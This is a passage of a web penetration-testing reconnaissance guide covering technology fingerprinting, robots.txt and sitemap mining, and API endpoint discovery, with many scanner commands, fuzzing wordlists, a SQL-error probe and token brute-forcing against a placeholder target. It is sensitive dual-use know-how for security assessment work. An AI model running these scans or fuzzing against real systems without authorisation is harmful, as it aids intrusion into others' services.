### HTTP Header Analysis

**Manual Header Inspection**

```bash
# Basic header retrieval
curl -I http://target.com

# Verbose output with all headers
curl -v http://target.com

# Follow redirects
curl -IL http://target.com

# Custom user agent
curl -H "User-Agent: Mozilla/5.0" -I http://target.com
```

**Key Headers for Technology Identification**

```bash
# Server identification
Server: Apache/2.4.41 (Ubuntu)
Server: nginx/1.18.0
Server: Microsoft-IIS/10.0

# Framework indicators
X-Powered-By: PHP/7.4.3
X-Powered-By: Express
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2

# Additional technology hints
X-Generator: Drupal 9
X-Drupal-Cache: HIT
X-Varnish: 123456
X-Cache: HIT from cloudflare
```

### Whatweb - Automated Identification

```bash
# Basic scan
whatweb http://target.com

# Verbose output
whatweb -v http://target.com

# Aggressive mode (more requests)
whatweb -a 3 http://target.com

# Output to JSON
whatweb --log-json=output.json http://target.com

# Scan multiple URLs
whatweb -i urls.txt

# Custom user agent
whatweb --user-agent "Mozilla/5.0" http://target.com
```

### Wappalyzer (Browser Extension & CLI)

**CLI Usage**

```bash
# Install
npm install -g wappalyzer

# Basic scan
wappalyzer http://target.com

# JSON output
wappalyzer http://target.com --pretty

# Batch scanning
cat urls.txt | xargs -I {} wappalyzer {}
```

**Browser Extension**

```
1. Install Wappalyzer browser extension
2. Navigate to target website
3. Click extension icon to view detected technologies
4. Export results as JSON/CSV
```

### WhatRuns (Browser Extension)

```
1. Install WhatRuns extension
2. Visit target website
3. Click extension icon
4. View categorized technology stack:
   - Web frameworks
   - JavaScript libraries
   - Analytics tools
   - CMS platforms
   - CDN services
```

### BuiltWith

```bash
# API usage
curl "https://api.builtwith.com/v20/api.json?KEY=YOUR_API_KEY&LOOKUP=target.com"

# Web interface: https://builtwith.com/target.com
```

### Wapiti - Vulnerability Scanner with Tech Detection

```bash
# Basic scan with technology detection
wapiti -u http://target.com

# Verbose output
wapiti -u http://target.com -v 2

# Specific modules
wapiti -u http://target.com -m nikto

# Output formats
wapiti -u http://target.com -f json -o output.json
```

### JavaScript Library Detection

**Retire.js - Find Vulnerable JS Libraries**

```bash
# Install
npm install -g retire

# Scan website
retire --jspath http://target.com

# Scan specific JS file
retire --jsrepo http://target.com/js/app.js

# Output JSON
retire --outputformat json http://target.com
```

**Manual JS Analysis**

```bash
# Download all JS files
wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off http://target.com

# Search for common libraries
grep -r "jQuery" *.js
grep -r "React.version" *.js
grep -r "Angular.version" *.js

# Extract version numbers
grep -oP "version.*[0-9]+\.[0-9]+\.[0-9]+" *.js
```

**Browser Console Detection**

```javascript
// Check for common frameworks
console.log(jQuery.fn.jquery);  // jQuery version
console.log(React.version);     // React version
console.log(angular.version);   // Angular version
console.log(Vue.version);       // Vue version

// Check for CMS indicators
console.log(Drupal);           // Drupal
console.log(wp);               // WordPress
```

### CMS Detection

**CMSmap**

```bash
# WordPress scan
cmsmap http://target.com

# Joomla scan
cmsmap -t J http://target.com

# Drupal scan
cmsmap -t D http://target.com

# Aggressive scan
cmsmap -a http://target.com

# Output to file
cmsmap -o output.txt http://target.com
```

**WPScan (WordPress-specific)**

```bash
# Basic WordPress scan
wpscan --url http://target.com

# Enumerate plugins
wpscan --url http://target.com --enumerate p

# Enumerate themes
wpscan --url http://target.com --enumerate t

# Enumerate users
wpscan --url http://target.com --enumerate u

# Vulnerable plugins detection
wpscan --url http://target.com --enumerate vp

# API token for vulnerability data
wpscan --url http://target.com --api-token YOUR_TOKEN
```

**Droopescan (Drupal/SilverStripe)**

```bash
# Drupal scan
droopescan scan drupal -u http://target.com

# Enumerate plugins
droopescan scan drupal -u http://target.com -e p

# Enumerate themes
droopescan scan drupal -u http://target.com -e t

# SilverStripe scan
droopescan scan silverstripe -u http://target.com
```

**JoomScan (Joomla-specific)**

```bash
# Basic Joomla scan
joomscan -u http://target.com

# Enumerate components
joomscan -u http://target.com --enumerate-components

# Check for vulnerabilities
joomscan -u http://target.com -ec
```

### Framework-Specific Fingerprinting

**ASP.NET Detection**

```bash
# Check for .aspx extensions
curl http://target.com/default.aspx

# ViewState parameter (ASP.NET indicator)
curl http://target.com | grep -i "__VIEWSTATE"

# Session cookie format
curl -I http://target.com | grep "ASP.NET_SessionId"
```

**PHP Framework Detection**

```bash
# Laravel detection
curl http://target.com | grep "laravel"
curl -I http://target.com/public/

# Symfony detection
curl http://target.com | grep "symfony"
curl http://target.com/app_dev.php

# CodeIgniter detection
curl http://target.com | grep "ci_session"

# CakePHP detection
curl http://target.com | grep "cakephp"
```

**Python Framework Detection**

```bash
# Django detection
curl -I http://target.com | grep -i "django"
curl http://target.com | grep "csrfmiddlewaretoken"

# Flask detection
curl -I http://target.com | grep "Werkzeug"
curl http://target.com/static/

# FastAPI detection
curl http://target.com/docs  # Swagger UI
curl http://target.com/redoc
```

**JavaScript Framework Detection**

```bash
# React detection
curl http://target.com | grep "react"
curl http://target.com | grep "data-reactroot"

# Angular detection
curl http://target.com | grep "ng-"
curl http://target.com | grep "angular"

# Vue.js detection
curl http://target.com | grep "vue"
curl http://target.com | grep "v-"
```

### Server-Side Technology Detection

**Nmap Service Detection**

```bash
# HTTP service detection
nmap -sV -p 80,443,8080,8443 target.com

# HTTP title and headers
nmap -p 80,443 --script http-title,http-headers target.com

# Comprehensive web scan
nmap -p 80,443 --script http-enum,http-headers,http-methods,http-title target.com
```

**Nikto - Web Server Scanner**

```bash
# Basic scan
nikto -h http://target.com

# SSL scan
nikto -h https://target.com -ssl

# Tuning for specific tests
nikto -h http://target.com -Tuning 1,2,3

# Save output
nikto -h http://target.com -o output.txt -Format txt

# Custom headers
nikto -h http://target.com -useragent "Custom Agent"
```

### Database Technology Detection

**[Inference]** Database types may be inferred from error messages, URL patterns, and specific behaviors:

**Error-Based Detection**

```bash
# Trigger errors to reveal database type
curl "http://target.com/page?id=1'"

# MySQL errors
"You have an error in your SQL syntax"
"mysql_fetch_array()"

# PostgreSQL errors
"pg_query()"
"PostgreSQL query failed"

# MSSQL errors
"Microsoft OLE DB Provider for SQL Server"
"Unclosed quotation mark after the character string"

# Oracle errors
"ORA-01756"
"oracle.jdbc.driver"
```

**SQLMap Database Detection**

```bash
# Identify database type
sqlmap -u "http://target.com/page?id=1" --banner

# Fingerprint DBMS
sqlmap -u "http://target.com/page?id=1" --fingerprint
```

### CDN and WAF Detection

**wafw00f - WAF Detection**

```bash
# Basic WAF detection
wafw00f http://target.com

# Verbose output
wafw00f -v http://target.com

# Test all WAF signatures
wafw00f -a http://target.com

# Output to JSON
wafw00f -o output.json -f json http://target.com
```

**CDN Detection**

```bash
# Check DNS for CDN indicators
dig target.com
nslookup target.com

# Common CDN patterns in DNS:
# - *.cloudflare.com
# - *.cloudfront.net
# - *.akamai.net
# - *.fastly.net

# HTTP header indicators
curl -I http://target.com | grep -i "cloudflare\|akamai\|fastly\|cloudfront"
```

### SSL/TLS Certificate Analysis

**SSL Certificate Inspection**

```bash
# OpenSSL certificate details
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text

# Extract issuer and subject
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -issuer -subject

# Check certificate chain
openssl s_client -showcerts -connect target.com:443
```

**SSLyze**

```bash
# Comprehensive SSL/TLS analysis
sslyze target.com

# Specific checks
sslyze --certinfo target.com
sslyze --heartbleed target.com
```

### Technology Stack Documentation

**Automated Reporting**

```bash
# Combine multiple tools for comprehensive report
{
    echo "=== WhatWeb Results ==="
    whatweb http://target.com
    echo ""
    echo "=== Nikto Results ==="
    nikto -h http://target.com
    echo ""
    echo "=== WAF Detection ==="
    wafw00f http://target.com
} > technology_stack_report.txt
```

---

## Robots.txt Analysis

### Purpose and Structure

Robots.txt is a file used to instruct web crawlers which parts of a website should not be processed or scanned. It often reveals sensitive directories, admin panels, and hidden resources.

### Basic Robots.txt Retrieval

```bash
# Direct access
curl http://target.com/robots.txt

# With response headers
curl -i http://target.com/robots.txt

# Check for existence
curl -I http://target.com/robots.txt

# Alternative locations
curl http://target.com/ROBOTS.TXT  # Case-insensitive on some servers
```

### Robots.txt Syntax and Directives

**Common Directives**

```
User-agent: *           # Applies to all bots
Disallow: /admin/       # Block access to directory
Allow: /public/         # Explicitly allow access
Crawl-delay: 10         # Delay between requests (seconds)
Sitemap: http://target.com/sitemap.xml  # Sitemap location
```

**Example Robots.txt**

```
User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /backup/
Disallow: /config/
Disallow: /dev/
Disallow: /*.sql$
Disallow: /*.bak$
Allow: /public/
Sitemap: http://target.com/sitemap.xml
```

### Automated Robots.txt Parsing

**Extract Disallowed Paths**

```bash
# Extract all disallowed paths
curl -s http://target.com/robots.txt | grep "Disallow:" | cut -d: -f2 | sed 's/^ *//'

# Extract and create full URLs
curl -s http://target.com/robots.txt | grep "Disallow:" | awk '{print "http://target.com"$2}'

# Filter out wildcards
curl -s http://target.com/robots.txt | grep "Disallow:" | grep -v "*" | awk '{print $2}'
```

**Python Script for Robots.txt Analysis**

```python
import requests
import re

def parse_robots(url):
    try:
        response = requests.get(f"{url}/robots.txt")
        if response.status_code == 200:
            disallowed = re.findall(r'Disallow:\s*(.+)', response.text)
            allowed = re.findall(r'Allow:\s*(.+)', response.text)
            sitemaps = re.findall(r'Sitemap:\s*(.+)', response.text)
            
            print("[+] Disallowed paths:")
            for path in disallowed:
                print(f"  - {path.strip()}")
            
            print("\n[+] Explicitly allowed paths:")
            for path in allowed:
                print(f"  - {path.strip()}")
            
            print("\n[+] Sitemaps:")
            for sitemap in sitemaps:
                print(f"  - {sitemap.strip()}")
                
    except Exception as e:
        print(f"[-] Error: {e}")

parse_robots("http://target.com")
```

### Interesting Patterns in Robots.txt

**High-Value Directories to Look For**

```
/admin/
/administrator/
/wp-admin/
/phpmyadmin/
/backup/
/backups/
/db/
/database/
/config/
/conf/
/api/
/dev/
/development/
/test/
/staging/
/private/
/internal/
/.git/
/.svn/
/.env
/logs/
/log/
```

### Testing Disallowed Paths

**Manual Path Testing**

```bash
# Test each disallowed path
curl -I http://target.com/admin/
curl -I http://target.com/backup/
curl -I http://target.com/private/

# Check for directory listing
curl http://target.com/admin/

# Test with authentication
curl -u username:password http://target.com/admin/
```

**Automated Path Validation**

```bash
# Extract and test all disallowed paths
curl -s http://target.com/robots.txt | grep "Disallow:" | awk '{print $2}' | while read path; do
    status=$(curl -s -o /dev/null -w "%{http_code}" http://target.com$path)
    echo "[$status] http://target.com$path"
done
```

**Using ffuf for Path Discovery**

```bash
# Extract paths from robots.txt
curl -s http://target.com/robots.txt | grep "Disallow:" | cut -d: -f2 | sed 's/^ *//' > disallowed.txt

# Fuzz based on patterns
ffuf -u http://target.com/FUZZ -w disallowed.txt -mc 200,301,302,403

# Recursive fuzzing on discovered paths
ffuf -u http://target.com/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### Robots.txt Bypass Techniques

**User-Agent Spoofing**

```bash
# Some applications check User-Agent against robots.txt rules
curl -A "Googlebot/2.1" http://target.com/admin/
curl -A "Mozilla/5.0" http://target.com/admin/

# Custom User-Agent
curl -H "User-Agent: CustomBot/1.0" http://target.com/private/
```

**Direct Access Attempts**

```bash
# Robots.txt is advisory, not enforced
# Try accessing disallowed paths directly
curl http://target.com/admin/
curl http://target.com/backup/

# [Inference] Many applications only rely on robots.txt without implementing actual access controls
```

### Robots.txt in Different Contexts

**Subdomain Robots.txt**

```bash
# Check robots.txt on all discovered subdomains
for subdomain in $(cat subdomains.txt); do
    echo "[+] Checking $subdomain"
    curl -s http://$subdomain/robots.txt
done
```

**Port-Specific Robots.txt**

```bash
# Check robots.txt on non-standard ports
curl http://target.com:8080/robots.txt
curl http://target.com:8443/robots.txt
```

### Historical Robots.txt Analysis

**Wayback Machine**

```bash
# Check historical versions
curl "http://web.archive.org/cdx/search/cdx?url=target.com/robots.txt&output=json"

# Access historical snapshot
curl "http://web.archive.org/web/20200101000000/http://target.com/robots.txt"
```

**Python Script for Historical Analysis**

```python
import requests

def check_wayback_robots(domain):
    url = f"http://web.archive.org/cdx/search/cdx?url={domain}/robots.txt&output=json"
    response = requests.get(url)
    
    if response.status_code == 200:
        snapshots = response.json()[1:]  # Skip header
        print(f"[+] Found {len(snapshots)} historical snapshots")
        
        for snapshot in snapshots[:5]:  # Show first 5
            timestamp = snapshot[1]
            snapshot_url = f"http://web.archive.org/web/{timestamp}/{domain}/robots.txt"
            print(f"  - {snapshot_url}")

check_wayback_robots("target.com")
```

### Robots.txt Security Implications

**Common Misconfigurations**

```
# Revealing sensitive files
Disallow: /backup.sql
Disallow: /database.bak
Disallow: /.env
Disallow: /config.php

# Revealing administrative interfaces
Disallow: /admin/
Disallow: /cpanel/
Disallow: /phpmyadmin/

# Development/staging environments
Disallow: /dev/
Disallow: /test/
Disallow: /staging/
```

---

## Sitemap Discovery

### Purpose and Types

Sitemaps provide structured information about website content to search engines. They reveal URL structures, update frequencies, and content organization.

### Sitemap Standard Locations

```bash
# Standard sitemap locations
curl http://target.com/sitemap.xml
curl http://target.com/sitemap_index.xml
curl http://target.com/sitemap.xml.gz

# WordPress-specific
curl http://target.com/wp-sitemap.xml
curl http://target.com/sitemap_index.xml

# Alternative locations
curl http://target.com/sitemap1.xml
curl http://target.com/sitemap-index.xml
curl http://target.com/sitemap.php
```

### Sitemap Discovery Methods

**From Robots.txt**

```bash
# Extract sitemap URLs from robots.txt
curl -s http://target.com/robots.txt | grep -i "sitemap:"

# Download all referenced sitemaps
curl -s http://target.com/robots.txt | grep -i "sitemap:" | awk '{print $2}' | while read sitemap; do
    echo "[+] Downloading $sitemap"
    curl -s "$sitemap" -o "$(basename $sitemap)"
done
```

**Automated Sitemap Discovery**

```bash
# Using ffuf
ffuf -u http://target.com/FUZZ -w sitemap_wordlist.txt -mc 200

# Custom wordlist for sitemaps
echo -e "sitemap.xml\nsitemap_index.xml\nsitemap1.xml\nsitemap.xml.gz\nwp-sitemap.xml" > sitemap_wordlist.txt

# Using gobuster
gobuster dir -u http://target.com -w sitemap_wordlist.txt -x xml,gz
```

### Sitemap XML Structure

**Basic Sitemap Format**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>http://target.com/page1</loc>
    <lastmod>2024-01-01</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>http://target.com/page2</loc>
    <lastmod>2024-01-02</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>
```

**Sitemap Index Format**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <sitemap>
    <loc>http://target.com/sitemap1.xml</loc>
    <lastmod>2024-01-01</lastmod>
  </sitemap>
  <sitemap>
    <loc>http://target.com/sitemap2.xml</loc>
    <lastmod>2024-01-02</lastmod>
  </sitemap>
</sitemapindex>
```

### Parsing Sitemap URLs

**Command-Line Parsing**

```bash
# Extract all URLs from sitemap
curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+'

# Count total URLs
curl -s http://target.com/sitemap.xml | grep -c "<loc>"

# Extract URLs with specific pattern
curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+' | grep "/admin/"

# Sort by lastmod date
curl -s http://target.com/sitemap.xml | grep -E "<loc>|<lastmod>" | paste -d " " - -
```

**Python Sitemap Parser**

```python
import requests
import xml.etree.ElementTree as ET

def parse_sitemap(url):
    response = requests.get(url)
    root = ET.fromstring(response.content)
    
    # Define namespace
    ns = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
    
    urls = []
    for url_elem in root.findall('ns:url', ns):
        loc = url_elem.find('ns:loc', ns).text
        lastmod = url_elem.find('ns:lastmod', ns)
        lastmod = lastmod.text if lastmod is not None else "N/A"
        priority = url_elem.find('ns:priority', ns)
        priority = priority.text if priority is not None else "N/A"
        
        urls.append({
            'url': loc,
            'lastmod': lastmod,
            'priority': priority
        })
    
    return urls

# Parse and display
sitemap_urls = parse_sitemap("http://target.com/sitemap.xml")
for item in sitemap_urls:
    print(f"[{item['priority']}] {item['url']} (Modified: {item['lastmod']})")
```

### Sitemap Index Processing

**Recursive Sitemap Crawler**

```python
import requests
import xml.etree.ElementTree as ET

def crawl_sitemap_index(index_url):
    response = requests.get(index_url)
    root = ET.fromstring(response.content)
    
    ns = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
    
    all_urls = []
    
    # Check if this is a sitemap index
    if root.tag == '{http://www.sitemaps.org/schemas/sitemap/0.9}sitemapindex':
        print("[+] Processing sitemap index")
        for sitemap in root.findall('ns:sitemap', ns):
            loc = sitemap.find('ns:loc', ns).text
            print(f"  [*] Crawling {loc}")
            
            # Recursively process each sitemap
            sub_response = requests.get(loc)
            sub_root = ET.fromstring(sub_response.content)
            
            for url_elem in sub_root.findall('ns:url', ns):
                url = url_elem.find('ns:loc', ns).text
                all_urls.append(url)
    else:
        # Regular sitemap
        for url_elem in root.findall('ns:url', ns):
            url = url_elem.find('ns:loc', ns).text
            all_urls.append(url)
    
    return all_urls

# Usage
urls = crawl_sitemap_index("http://target.com/sitemap_index.xml")
print(f"\n[+] Total URLs found: {len(urls)}")
```

### Analyzing Sitemap Content

**Identify Interesting Paths**

```bash
# Download sitemap
curl -s http://target.com/sitemap.xml -o sitemap.xml

# Find admin/private paths
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "admin|private|internal|dev|test|staging"

# Find API endpoints
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "api|v[0-9]|rest|graphql"

# Find file uploads/documents
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "upload|document|pdf|doc|xls"

# Find user-generated content
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "user|profile|member"
```

**URL Pattern Analysis**

```bash
# Extract URL patterns
grep -oP '<loc>\K[^<]+' sitemap.xml | sed 's/[0-9]\+/ID/g' | sort -u

# Identify parameter-based URLs
grep -oP '<loc>\K[^<]+' sitemap.xml | grep "?"

# Find potential ID enumeration targets
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "id=[0-9]+|user=[0-9]+"
```

### Sitemap-Based Fuzzing

**Generate Fuzzing Wordlist from Sitemap**

```bash
# Extract all path components
grep -oP '<loc>\K[^<]+' sitemap.xml | sed 's|http[s]*://[^/]*||' | tr '/' '\n' | grep -v "^$" | sort -u > wordlist.txt

# Use for directory fuzzing
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Extract query parameters for fuzzing
grep -oP '<loc>\K[^<]+' sitemap.xml | grep -oP '\?.*' | tr '&' '\n' | cut -d= -f1 | sort -u > params.txt
```

### Compressed Sitemap Handling

```bash
# Download and decompress gzipped sitemap
curl -s http://target.com/sitemap.xml.gz | gunzip > sitemap.xml

# Process compressed sitemap directly
curl -s http://target.com/sitemap.xml.gz | gunzip | grep -oP '<loc>\K[^<]+'
```

### Sitemap Differential Analysis

**Compare Current vs Historical Sitemaps**

```bash
# Download current sitemap
curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+' | sort > current_urls.txt

# Download historical sitemap from Wayback Machine
curl -s "http://web.archive.org/web/20230101000000/http://target.com/sitemap.xml" | grep -oP '<loc>\K[^<]+' | sort > old_urls.txt

# Find newly added URLs
comm -13 old_urls.txt current_urls.txt > new_urls.txt

# Find removed URLs
comm -23 old_urls.txt current_urls.txt > removed_urls.txt

# Display results
echo "[+] Newly added URLs:"
cat new_urls.txt
echo "[+] Removed URLs:"
cat removed_urls.txt
```

---

## API Endpoint Discovery

### Purpose and Methodology

API endpoint discovery identifies both documented and undocumented API routes that may expose sensitive functionality, data access, or administrative operations.

### Common API Patterns and Conventions

**RESTful API Patterns**

```
/api/v1/users
/api/v1/users/{id}
/api/v2/products
/api/admin/settings
/rest/users
/services/data
```

**GraphQL Patterns**

```
/graphql
/api/graphql
/v1/graphql
/query
```

**SOAP Patterns**

```
/soap
/services
/ws
/webservice
*.asmx
*.wsdl
```

### JavaScript File Analysis for API Discovery

**Extract API Endpoints from JavaScript**

```bash
# Download all JavaScript files
wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off http://target.com

# Search for API patterns
grep -rhoP "https?://[^\"']*/api/[^\"\s']+" *.js | sort -u

# Find relative API paths
grep -rhoP "['\"]/(api|v[0-9]|rest|graphql)/[^'\"]*" *.js | sort -u

# Extract endpoints with parameters
grep -rhoP "['\"]/.+\?[^'\"]*" *.js | sort -u
```

**LinkFinder - JavaScript Endpoint Extraction**

```bash
# Install
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
python3 setup.py install

# Scan single URL
python3 linkfinder.py -i http://target.com/app.js -o cli

# Scan domain (crawl for JS files)
python3 linkfinder.py -i http://target.com -d -o cli

# Output to HTML
python3 linkfinder.py -i http://target.com -o results.html
```

**JSParser**

```bash
# Install
git clone https://github.com/nahamsec/JSParser.git

# Extract endpoints
python3 handler.py http://target.com/app.js

# Process multiple files
find . -name "*.js" -exec python3 handler.py {} \;
```

### API Documentation Discovery

**Common Documentation Endpoints**

```bash
# Swagger/OpenAPI
curl http://target.com/swagger
curl http://target.com/swagger.json
curl http://target.com/swagger.yaml
curl http://target.com/swagger-ui
curl http://target.com/swagger-ui.html
curl http://target.com/api-docs
curl http://target.com/api/swagger.json
curl http://target.com/v1/swagger.json
curl http://target.com/v2/api-docs

# ReDoc
curl http://target.com/redoc
curl http://target.com/docs

# API Blueprint
curl http://target.com/api.md
curl http://target.com/blueprint

# WADL (Web Application Description Language)
curl http://target.com/application.wadl curl http://target.com/api/application.wadl

# RAML (RESTful API Modeling Language)

curl http://target.com/api.raml curl http://target.com/api/api.raml

# GraphQL introspection

curl http://target.com/graphql?query={__schema{types{name}}}

# Postman collections

curl http://target.com/postman.json curl http://target.com/collection.json
````

**Automated Documentation Discovery**
```bash
# Create wordlist for API documentation
cat > api_docs.txt << EOF
swagger
swagger.json
swagger.yaml
swagger-ui
swagger-ui.html
api-docs
api/swagger.json
v1/swagger.json
v2/api-docs
redoc
docs
api/docs
documentation
api-documentation
openapi.json
openapi.yaml
wadl
application.wadl
graphql
api/graphql
EOF

# Fuzz for documentation
ffuf -u http://target.com/FUZZ -w api_docs.txt -mc 200,301,302

# Multi-level fuzzing
ffuf -u http://target.com/api/FUZZ -w api_docs.txt -mc 200
````

### GraphQL Endpoint Discovery and Introspection

**Finding GraphQL Endpoints**

```bash
# Common GraphQL locations
curl -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
curl -X POST http://target.com/api/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
curl -X POST http://target.com/v1/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
curl -X POST http://target.com/query -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
```

**GraphQL Introspection Query**

```bash
# Full schema introspection
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
      }
    }
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
      }
    }
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
    }
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
      }
    }"
  }'

# List all queries
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# List all mutations
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description } } } }"}'
```

**GraphQL Voyager (Visual Schema Explorer)**

```bash
# Access if exposed
curl http://target.com/voyager

# Or use standalone with introspection JSON
# 1. Save introspection query result to file
# 2. Upload to https://graphql-voyager.netlify.app/
```

**InQL Scanner (Burp Extension)**

```
1. Install InQL from BApp Store in Burp Suite
2. Navigate to GraphQL endpoint in browser (proxied through Burp)
3. Right-click request > InQL > Generate queries
4. Review generated queries in InQL tab
```

### REST API Fuzzing

**Common REST API Wordlists**

```bash
# API-specific wordlists
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Custom API wordlist
cat > api_endpoints.txt << EOF
users
user
accounts
account
profile
profiles
admin
admins
products
product
orders
order
payments
payment
transactions
transaction
settings
config
configuration
status
health
info
version
auth
login
logout
register
signup
token
refresh
api-keys
keys
webhooks
notifications
messages
files
upload
download
search
query
EOF
```

**ffuf API Fuzzing**

```bash
# Basic API endpoint discovery
ffuf -u http://target.com/api/v1/FUZZ -w api_endpoints.txt -mc 200,201,301,302,401,403

# Multiple API versions
ffuf -u http://target.com/api/APIVER/ENDPOINT -w versions.txt:APIVER -w endpoints.txt:ENDPOINT

# HTTP method fuzzing
ffuf -u http://target.com/api/users/1 -w methods.txt -X FUZZ

# Parameter fuzzing
ffuf -u http://target.com/api/users?FUZZ=test -w parameters.txt -mc 200
```

**Gobuster API Mode**

```bash
# Directory/endpoint enumeration
gobuster dir -u http://target.com/api/v1 -w api_endpoints.txt

# With specific patterns
gobuster dir -u http://target.com/api -w wordlist.txt -p api-patterns.txt
```

**wfuzz for API Discovery**

```bash
# Basic endpoint fuzzing
wfuzz -w api_endpoints.txt http://target.com/api/FUZZ

# Multi-parameter fuzzing
wfuzz -w wordlist.txt -w ids.txt http://target.com/api/FUZZ/FUZ2Z

# Header-based authentication fuzzing
wfuzz -H "Authorization: Bearer FUZZ" -w tokens.txt http://target.com/api/admin
```

### API Version Discovery

**Version Enumeration**

```bash
# Common version patterns
for ver in v1 v2 v3 v4 v5 api/v1 api/v2; do
    echo "[*] Testing $ver"
    curl -I http://target.com/$ver/users
done

# Numeric versions
for i in {1..10}; do
    curl -I http://target.com/api/v$i/
done

# Date-based versions
for year in 2020 2021 2022 2023 2024; do
    curl -I http://target.com/api/$year-01-01/
done
```

**Version Fuzzing Script**

```python
import requests

target = "http://target.com"
versions = [
    "v1", "v2", "v3", "v4", "v5",
    "api/v1", "api/v2", "api/v3",
    "1.0", "2.0", "3.0",
    "1", "2", "3", "4", "5"
]

endpoints = ["users", "products", "orders", "admin"]

for version in versions:
    for endpoint in endpoints:
        url = f"{target}/{version}/{endpoint}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code != 404:
                print(f"[{response.status_code}] {url}")
        except:
            pass
```

### HTTP Method Discovery

**Method Enumeration with curl**

```bash
# Test different HTTP methods
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
    echo "[*] Testing $method"
    curl -X $method -I http://target.com/api/users/1
done

# OPTIONS request for allowed methods
curl -X OPTIONS http://target.com/api/users -v
```

**Burp Suite Intruder for Method Fuzzing**

```
1. Send API request to Intruder
2. Clear all payload positions
3. Change request method to Â§GETÂ§
4. Add payload list: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, TRACE
5. Start attack
6. Analyze responses for different status codes
```

**Arjun - HTTP Parameter Discovery**

```bash
# Install
pip3 install arjun

# Discover GET parameters
arjun -u http://target.com/api/users

# Discover POST parameters
arjun -u http://target.com/api/login -m POST

# With custom headers
arjun -u http://target.com/api/admin -H "Authorization: Bearer token"

# Import from Burp
arjun -i burp_requests.xml

# JSON body parameter discovery
arjun -u http://target.com/api/data -m POST -t json
```

### API Authentication Discovery

**Common Authentication Endpoints**

```bash
# OAuth endpoints
curl http://target.com/oauth/authorize
curl http://target.com/oauth/token
curl http://target.com/.well-known/openid-configuration

# JWT endpoints
curl http://target.com/api/auth/login
curl http://target.com/api/auth/refresh
curl http://target.com/api/token

# API key endpoints
curl http://target.com/api/keys
curl http://target.com/api/apikeys
curl http://target.com/api/tokens

# Session endpoints
curl http://target.com/api/session
curl http://target.com/api/login
curl http://target.com/api/authenticate
```

**Testing Authentication Methods**

```bash
# Basic Auth
curl -u username:password http://target.com/api/users

# Bearer Token
curl -H "Authorization: Bearer token123" http://target.com/api/users

# API Key in header
curl -H "X-API-Key: key123" http://target.com/api/users
curl -H "Api-Key: key123" http://target.com/api/users

# API Key in query parameter
curl http://target.com/api/users?api_key=key123
curl http://target.com/api/users?apikey=key123

# Cookie-based
curl -b "session=sessiontoken" http://target.com/api/users
```

### Burp Suite for API Discovery

**Passive API Discovery**

```
1. Navigate application with Burp proxy enabled
2. Target > Site map
3. Filter for /api, /v[0-9], /rest, /graphql
4. Review all API calls in HTTP history
5. Note unique endpoints and parameters
```

**Active API Discovery with Spider**

```
1. Target > Site map > Right-click target
2. Spider this host
3. Options > Configure to include API patterns
4. Review discovered API endpoints
```

**Content Discovery**

```
1. Target > Site map > Right-click on /api
2. Engagement tools > Discover content
3. Configure wordlists for API paths
4. Review discovered content
```

### Kiterunner - API Enumeration Tool

```bash
# Install
git clone https://github.com/assetnote/kiterunner.git
cd kiterunner
make build

# Basic scan with common routes
./kr scan http://target.com -w routes-large.kite

# Scan specific API path
./kr scan http://target.com/api -w routes-small.kite

# Brute force mode
./kr brute http://target.com/api -w routes.txt

# With authentication
./kr scan http://target.com -H "Authorization: Bearer token" -w routes.kite

# Output to JSON
./kr scan http://target.com -w routes.kite -o json > results.json
```

### Postman Collection Discovery

**Finding Exposed Collections**

```bash
# Common locations
curl http://target.com/postman_collection.json
curl http://target.com/api/postman_collection.json
curl http://target.com/collection.json

# Search in JavaScript files
grep -r "postman" *.js
grep -r "collection" *.js | grep -i "json"
```

**Postman Collection Analysis**

